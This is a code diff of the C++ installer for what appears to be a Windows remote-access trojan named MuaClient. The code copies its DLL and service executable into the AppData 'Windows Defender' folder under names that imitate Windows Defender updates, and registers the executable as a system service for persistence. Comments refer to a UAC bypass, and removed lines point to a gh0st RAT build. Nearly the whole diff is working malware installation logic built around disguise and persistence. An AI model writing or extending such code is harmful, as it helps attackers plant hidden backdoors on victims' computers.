@@ -11,6 +11,8 @@
 #include "SystemService.h"
 
 
+// 安装前需要使得Install.exe, MuaClient.dll, SystemService.exe三者在同一目录下
+
 int main()
 {
 	// 创建互斥量
@@ -50,37 +52,55 @@ int main()
 
 	//// 非第一次，已提权
 	//else {
-		
-		// 程序所在目录
-		WCHAR pszMuaClientDllPath[MAX_PATH];
-		GetModuleFileName(NULL, pszMuaClientDllPath, MAX_PATH);
-		WCHAR *pPos = NULL;
-		pPos = wcsrchr(pszMuaClientDllPath, '\\');
-		*pPos = NULL;
-		// 拼接成MuaClient.dll的路径（假设InstallMuaClient.exe和MuaClient.dll位于同一目录下）
-		wcscat_s(pszMuaClientDllPath, L"\\MuaClient.dll");
 
+		// 程序所在目录
+		WCHAR pszFileDir[MAX_PATH];
+		GetModuleFileName(NULL, pszFileDir, MAX_PATH);
+		WCHAR *pPos = NULL;
+		pPos = wcsrchr(pszFileDir, '\\');
+		*pPos = NULL;
+
+		WCHAR pszMuaClientDllPath[MAX_PATH];
+		WCHAR pszSystemServiceExePath[MAX_PATH];
+		wcscpy_s(pszMuaClientDllPath, pszFileDir);
+		wcscpy_s(pszSystemServiceExePath, pszFileDir);
+
+		// 拼接成MuaClient.dll和SystemService.exe的路径
+		wcscat_s(pszMuaClientDllPath, L"\\MuaClient.dll");
+		//wcscat_s(pszSystemServiceExePath, L"\\SystemService.exe");
+		wcscat_s(pszSystemServiceExePath, L"\\TestRunMuaClientDll.exe");
+
+		// MuaClient.dll和SystemService.exe不在当前目录则退出安装程序
+		if (!(PathFileExists(pszMuaClientDllPath) && PathFileExists(pszSystemServiceExePath))){
+			return -1;
+		}
+
+		// C:\Users\iyzyi\AppData\Roaming
 		WCHAR pszNewMuaClientDllPath[MAX_PATH];
-		SHGetSpecialFolderPath(NULL, pszNewMuaClientDllPath, CSIDL_APPDATA, FALSE);	// C:\Users\iyzyi\AppData\Roaming
+		WCHAR pszNewSystemServiceExePath[MAX_PATH];
+		SHGetSpecialFolderPath(NULL, pszNewMuaClientDllPath, CSIDL_APPDATA, FALSE);
+		SHGetSpecialFolderPath(NULL, pszNewSystemServiceExePath, CSIDL_APPDATA, FALSE);
+
+		// C:\Users\iyzyi\AppData\Roaming\Windows Defender
 		wcscat_s(pszNewMuaClientDllPath, L"\\Windows Defender");
-		if (!PathIsDirectory(pszNewMuaClientDllPath)) {								// C:\Users\iyzyi\AppData\Roaming\Windows Defender 不存在则创建文件夹
+		wcscat_s(pszNewSystemServiceExePath, L"\\Windows Defender");
+		if (!PathIsDirectory(pszNewMuaClientDllPath)) {			//不存在则创建文件夹
 			CreateDirectory(pszNewMuaClientDllPath, NULL);
 		}
-		wcscat_s(pszNewMuaClientDllPath, L"\\WindowsDefenderAutoUpdate.dll");		// C:\Users\iyzyi\AppData\Roaming\Windows Defender\WindowsDefenderAutoUpdate.dll
+
+		// C:\Users\iyzyi\AppData\Roaming\Windows Defender\WindowsDefenderAutoUpdate.dll
+		wcscat_s(pszNewMuaClientDllPath, L"\\WindowsDefenderAutoUpdate.dll");	
+		// C:\Users\iyzyi\AppData\Roaming\Windows Defender\WindowsDefenderAutoUpdate.exe
+		wcscat_s(pszNewSystemServiceExePath, L"\\WindowsDefenderAutoUpdate.exe");
 
 		// 第三个参数表示覆盖旧文件
 		CopyFile(pszMuaClientDllPath, pszNewMuaClientDllPath, FALSE);
+		CopyFile(pszSystemServiceExePath, pszNewSystemServiceExePath, FALSE);
 
 
-		//RegisterSystemService(pszNewMuaClientDllPath);
-		//WCHAR pszTemp[MAX_PATH] = L"C:\\Users\\iyzyi\\Desktop\\WINDOWS黑客编程技术详解-配套代码\\用户层\\5\\系统服务\\AutoRun_Service_Test\\Debug\\d d\\ServiceTest.exe";
-		WCHAR pszTemp[MAX_PATH] = L"C:\\Users\\iyzyi\\Desktop\\gh0st vs2017\\Release\\svchost.dll";
-		RegisterSystemService(pszTemp);
-
-
-
-
-
+		// 注册系统服务
+		//RegisterSystemService((LPWSTR)L"C:\\Users\\iyzyi\\Desktop\\WINDOWS黑客编程技术详解-配套代码\\用户层\\5\\系统服务\\AutoRun_Service_Test\\Debug\\ServiceTest.exe");
+		RegisterSystemService(pszNewSystemServiceExePath);
 		
 		//删掉这个用于表示BypassUAC的文件
 		if (PathFileExists(pszTempPathWillBypassUAC)) {
